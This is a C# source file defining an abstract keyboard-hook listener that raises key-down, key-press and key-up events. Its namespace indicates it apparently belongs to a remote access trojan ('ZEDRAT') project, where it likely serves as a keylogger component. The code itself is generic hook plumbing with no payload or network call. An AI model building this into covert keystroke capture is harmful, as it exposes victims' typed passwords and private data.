using System.Collections.Generic;
using System.Windows.Forms;
using ZEDRatApp.ZEDRAT.MouseKeyHook.WinApi;

namespace ZEDRatApp.ZEDRAT.MouseKeyHook.Implementation
{
	internal abstract class KeyListener : BaseListener, IKeyboardEvents
	{
		public event KeyEventHandler KeyDown;

		public event KeyPressEventHandler KeyPress;

		public event KeyEventHandler KeyUp;

		protected KeyListener(Subscribe subscribe)
			: base(subscribe)
		{
		}

		public void InvokeKeyDown(KeyEventArgsExt e)
		{
			KeyEventHandler keyDown = this.KeyDown;
			if (keyDown != null && !e.Handled && e.IsKeyDown)
			{
				keyDown(this, e);
			}
		}

		public void InvokeKeyPress(KeyPressEventArgsExt e)
		{
			KeyPressEventHandler keyPress = this.KeyPress;
			if (keyPress != null && !e.Handled && !e.IsNonChar)
			{
				keyPress(this, e);
			}
		}

		public void InvokeKeyUp(KeyEventArgsExt e)
		{
			KeyEventHandler keyUp = this.KeyUp;
			if (keyUp != null && !e.Handled && e.IsKeyUp)
			{
				keyUp(this, e);
			}
		}

		protected override bool Callback(CallbackData data)
		{
			KeyEventArgsExt downUpEventArgs = this.GetDownUpEventArgs(data);
			IEnumerable<KeyPressEventArgsExt> pressEventArgs = this.GetPressEventArgs(data);
			this.InvokeKeyDown(downUpEventArgs);
			foreach (KeyPressEventArgsExt item in pressEventArgs)
			{
				this.InvokeKeyPress(item);
			}
			this.InvokeKeyUp(downUpEventArgs);
			return !downUpEventArgs.Handled;
		}

		protected abstract IEnumerable<KeyPressEventArgsExt> GetPressEventArgs(CallbackData data);

		protected abstract KeyEventArgsExt GetDownUpEventArgs(CallbackData data);
	}
}
